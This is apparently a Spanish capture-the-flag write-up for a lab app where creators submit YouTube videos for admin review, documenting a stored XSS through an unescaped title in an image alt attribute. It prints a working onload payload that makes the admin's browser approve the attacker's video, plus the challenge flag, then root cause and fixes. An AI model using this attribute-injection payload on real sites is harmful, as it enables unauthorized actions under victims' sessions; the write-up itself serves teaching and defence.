# Revisor de Videos — Writeup (HackLab 2026)

- **Plataforma:** HackLab / SoftwareSeguro
- **Categoría:** Stored XSS (HTML Attribute Injection) / acción administrativa mediante sesión autenticada
- **Vulnerabilidad:** CWE-79 — Improper Neutralization of Input During Web Page Generation (Cross-Site Scripting)
- **Autor / Colaborador:** Lucas
- **Estado:** ✅ Resuelto; flag recuperada y confirmada en la plataforma
- **Flag:** `7295a63194c3ce7c1a752c6e07920e9d`

> **Alcance:** resolución del desafío dentro de la instancia de laboratorio. Se utilizó la visita del administrador provista por la plataforma, sin atacar el mecanismo de ingeniería social. Este writeup documenta nuestras propias pruebas, sin consultar soluciones del reto.

---

## 1. Enunciado y objetivo

**Revisor de Videos** es una plataforma donde los creadores envían videos de YouTube y un administrador decide si aceptarlos o rechazarlos. Ingresamos como el usuario **creador** con permisos limitados: podemos proponer videos, pero no aprobarlos.

El desafío incluye una función que permite **hacer que el administrador visite una URL de la misma instancia**, con una restricción de una visita por minuto.

**Objetivo:** conseguir que el administrador acepte uno de nuestros videos y recuperar el código ganador devuelto por la aplicación.

---

## 2. Reconocimiento y primeras hipótesis

El HTML mostraba dos áreas:

- `#vista-creador`: formulario para enviar enlaces de YouTube y cola de videos propia, sin botones de aprobación.
- `#vista-admin`: cola con acciones para aceptar o rechazar videos.

Ambas vistas existían en el documento, pero estaban ocultas inicialmente mediante `hidden`. Por sí solo, este atributo no representaba una vulnerabilidad: era necesario comprobar los controles de autorización del servidor.

Las categorías candidatas iniciales fueron **Stored XSS**, **CSRF**, **DOM XSS** y **Broken Access Control**. La pista del bot que visita una URL con sesión administrativa hacía especialmente razonable investigar si contenido controlado por un creador podía ejecutar JavaScript al ser renderizado por el administrador.

La página importaba el archivo `/static/app.js`. Lo recuperamos desde la consola:

~~~javascript
fetch('/static/app.js')
  .then(r => r.text())
  .then(code => console.log(code));
~~~

### 2.1. Autenticación del frontend

El script guardaba un JWT y el rol en `localStorage`:

~~~javascript
const TOKEN_KEY = "jwt";

function getToken() {
  try { return localStorage.getItem(TOKEN_KEY); }
  catch (e) { return null; }
}

function getRole() {
  try { return localStorage.getItem("role"); }
  catch (e) { return null; }
}
~~~

La función `api()` adjuntaba ese token a las peticiones:

~~~javascript
const tok = getToken();
if (tok) headers["Authorization"] = "Bearer " + tok;
~~~

Esto significaba que JavaScript ejecutado en el contexto del administrador podría realizar peticiones autenticadas **en su nombre**. No era necesario extraer ni exfiltrar el token.

### 2.2. Flujo de videos

Al enviar el formulario, el cliente hacía:

~~~javascript
await api("/api/videos", {
  method: "POST",
  body: JSON.stringify({
    url: input.value,
    turnstile_token: token
  }),
});
~~~

El servidor obtenía los metadatos del video de YouTube: título, miniatura, autor, descripción, etc. El control Turnstile se completó normalmente: **no fue objeto de explotación ni se intentó evadirlo**.

También identificamos que un administrador podía cambiar el estado de un video mediante:

~~~javascript
async function cambiarEstado(id, estado) {
  try {
    await api(`/api/videos/${id}/estado`, {
      method: "POST",
      body: JSON.stringify({ estado })
    });
    cargarCola();
  } catch (err) {
    aviso(err.message || "No se pudo actualizar", "error");
  }
}
~~~

En este caso, `estado` admitía la acción administrativa `aceptado`.

---

## 3. Identificación de la vulnerabilidad

Al inspeccionar `cargarCola()` —la función que construía la lista del administrador— encontramos que se insertaba contenido controlado por terceros en `innerHTML`.

La mayoría de los valores pasaban por `esc()`, una función que escapaba caracteres como `&`, `<`, `>` y comillas. **Pero el título del video no se escapaba dentro del atributo `alt` de la miniatura:**

~~~javascript
cont.innerHTML = videos.map(v => `
  <li class="video estado-${esc(v.estado)}" data-id="${esc(v.id)}">
    <div class="miniatura">
      ${v.miniatura
        ? `<img src="${esc(v.miniatura)}" alt="${v.titulo}">`
        : ""}
    </div>
  </li>
`).join("");
~~~

La línea decisiva era:

~~~html
<img src="MINIATURA_ESCAPADA" alt="TITULO_SIN_ESCAPAR">
~~~

Un título con comillas dobles podía **cerrar prematuramente el atributo `alt`** y crear un nuevo atributo HTML de evento, por ejemplo `onload`.

El mismo defecto existía también en `cargarColaCreador()`. Por esa razón, un payload no condicionado también podría ejecutarse al mostrar la cola en nuestra propia sesión.

**Categoría confirmada por el código:** Stored XSS (inyección en atributo HTML mediante título almacenado).

---

## 4. Explotación paso a paso

### Paso 1 — Preparar el payload

Construimos un título que rompía el atributo `alt`, agregaba un evento `onload` y llamaba a la función de aprobación **solo cuando el rol del navegador fuese `admin`**:

~~~text
x" onload="getRole()=='admin'&&cambiarEstado(this.closest('li').dataset.id,'aceptado')" x="
~~~

Desglose:

1. `x"`: finaliza el valor del atributo `alt`.
2. `onload="..."`: ejecuta JavaScript al cargar la miniatura.
3. `getRole()=='admin'`: evita intentar una aprobación desde la vista del creador.
4. `this.closest('li').dataset.id`: obtiene el ID del propio video que contiene el payload, sin tener que adivinarlo.
5. `cambiarEstado(..., 'aceptado')`: realiza el POST con el JWT del administrador mediante la función `api()` del frontend.
6. `x="`: absorbe la comilla final de la plantilla HTML y mantiene válido el marcado resultante.

**Importante:** el código no roba el JWT ni modifica directamente `localStorage`. Aprovecha las funciones legítimas del frontend en un navegador que ya está autenticado como administrador.

### Paso 2 — Almacenar el título malicioso

Publicamos un video de prueba en YouTube con el payload exactamente como título. Luego, desde el formulario del desafío:

1. Pegamos el enlace del video propio.
2. Completamos el Turnstile de forma normal.
3. Enviamos el enlace para revisión.

El backend obtuvo el título desde YouTube y lo almacenó junto con la miniatura del video. Así logramos controlar indirectamente el campo `titulo`, aunque el formulario de la aplicación solo aceptara una URL.

### Paso 3 — Comprobar que el payload persistió

Consultamos la API con nuestra sesión de creador:

~~~javascript
fetch('/api/videos', {
  headers: {
    Authorization: 'Bearer ' + localStorage.getItem('jwt')
  }
})
.then(r => r.json())
.then(d => console.table(
  d.videos.map(v => ({
    id: v.id,
    titulo: v.titulo,
    estado: v.estado,
    miniatura: v.miniatura
  }))
));
~~~

**Evidencia obtenida:**

| ID | Título | Estado | Miniatura |
| --- | --- | --- | --- |
| `2` | `x" onload="getRole()=='admin'&&cambiarEstado(this.closest('li').dataset.id,'aceptado')" x="` | `pendiente` | URL de `i.ytimg.com` presente |
| `1` | ¿POR QUÉ ROBLOX ES TAN ADICTIVO? | `pendiente` | URL de `i.ytimg.com` presente |

La persistencia del título con las comillas intactas confirmó que el backend no había neutralizado la cadena antes de que llegara al frontend. La presencia de una miniatura hacía posible que el navegador disparara `onload` al cargarla.

### Paso 4 — Provocar la visita del administrador

Con el video **ID 2** pendiente y el payload almacenado, utilizamos la función provista por el desafío para enviar al administrador la **URL principal de la instancia**, no la URL de YouTube.

El flujo previsto era:

1. El navegador del administrador accede a la aplicación con su sesión.
2. La vista administrativa ejecuta `cargarCola()` y consulta `GET /api/videos`.
3. La plantilla construye la miniatura con el título malicioso **sin escapar**.
4. Al cargar la imagen, se dispara el evento `onload`.
5. El código verifica el rol `admin` y llama a `cambiarEstado(2, 'aceptado')`.
6. La función utiliza el JWT del administrador para enviar `POST /api/videos/2/estado` con `{"estado":"aceptado"}`.

No capturamos un registro de red interno del navegador administrador, pero **el cambio de estado observado después de la visita coincide con el efecto previsto por este payload**.

### Paso 5 — Verificar el resultado

Después de la visita, consultamos de nuevo:

~~~javascript
fetch('/api/videos', {
  headers: {
    Authorization: 'Bearer ' + localStorage.getItem('jwt')
  }
})
.then(r => r.json())
.then(d => console.table(
  d.videos.map(v => ({
    id: v.id,
    estado: v.estado,
    hash_ganador: v.hash_ganador || ''
  }))
));
~~~

**Respuesta observada:**

| ID | Estado | `hash_ganador` |
| --- | --- | --- |
| **2** | **aceptado** | **`7295a63194c3ce7c1a752c6e07920e9d`** |
| 1 | rechazado | vacío |

El rechazo del video 1 también se observó, pero **no lo atribuimos a nuestro payload**, que solo intentaba aceptar el video que lo contenía.

---

## 5. Resultado / Flag

El servidor devolvió el hash ganador al quedar aceptado el video 2:

~~~text
7295a63194c3ce7c1a752c6e07920e9d
~~~

**Estado final:** la flag fue ingresada y **confirmada como válida en la plataforma del desafío**.

---

## 6. Causa raíz

La aplicación mezclaba **datos externos no confiables** (el título recuperado de YouTube) con **marcado HTML generado dinámicamente**.

Aunque `esc()` protegía el texto del título dentro de `<h3>` y otros campos, el atributo `alt` de la imagen lo interpolaba sin escapar. El uso de `innerHTML` hizo que la cadena se interpretara como HTML ejecutable, en vez de tratarla como dato.

El resultado fue un **Stored XSS** que permitió realizar una acción administrativa usando la sesión del navegador víctima. La vulnerabilidad no demuestra que el endpoint de aprobación aceptara solicitudes directas de usuarios `creador`; la petición exitosa se realizó aprovechando el contexto autenticado del administrador.

El almacenamiento del JWT en `localStorage` aumentaba el impacto potencial de cualquier XSS, pero en la explotación comprobada **no fue necesario extraerlo**.

---

## 7. Remediación defensiva

1. **Escapar todos los valores interpolados en HTML, incluidos los atributos**. Corrección mínima del caso identificado:

   ~~~javascript
   // Vulnerable
   alt="${v.titulo}"

   // Corregido
   alt="${esc(v.titulo)}"
   ~~~

2. **Evitar `innerHTML` con datos no confiables**. Construir los elementos mediante `document.createElement()` y asignar propiedades como `img.alt = v.titulo`, de forma que se traten como texto.
3. **Aplicar una Content Security Policy restrictiva**, sin permitir manejadores inline como `onload`, como defensa adicional.
4. **Mantener la autorización del lado del servidor** para `POST /api/videos/:id/estado`, verificando los privilegios de la identidad autenticada en cada petición.
5. **Reducir el impacto de un XSS sobre sesiones**; no confiar en el rol almacenado en `localStorage` como control de permisos y evaluar alternativas de gestión segura de sesiones.
6. **Tratar los metadatos provenientes de terceros como entrada no confiable**. Que el título provenga de YouTube no significa que sea seguro interpolarlo directamente en HTML.

---

## 8. Herramientas utilizadas

- **Browser DevTools (Console / Network):** lectura de `app.js`, inspección de las peticiones y comprobación de estados.
- **JavaScript / Fetch API:** consultas autenticadas a `/api/videos` desde la sesión propia.
- **YouTube:** alojamiento de un video controlado por el atacante con el título malicioso.
- **Función de visita administrativa del CTF:** activación del navegador del administrador según la mecánica autorizada del reto.

---

## 9. Lecciones aprendidas

- El lugar donde se **renderiza** un dato importa tanto como su origen: escapar el título dentro de `<h3>` no protege automáticamente el mismo valor dentro de `alt`.
- Los metadatos de servicios externos pueden funcionar como **vectores indirectos de entrada** para un Stored XSS.
- Si un sitio incluye un **bot administrador que visita URLs**, conviene analizar primero los sinks DOM y los controles de autorización antes de gastar visitas.
- Utilizar las funciones existentes del frontend (`getRole()`, `cambiarEstado()` y `api()`) permitió cumplir el objetivo sin exfiltración de credenciales.
- La evidencia importante fue el cambio de `pendiente` a `aceptado` y el `hash_ganador` validado en la plataforma; no solo la presencia del payload almacenado.

---

*Writeup elaborado a partir del código y las evidencias obtenidas durante la resolución independiente del desafío, sin consultar writeups externos del reto.*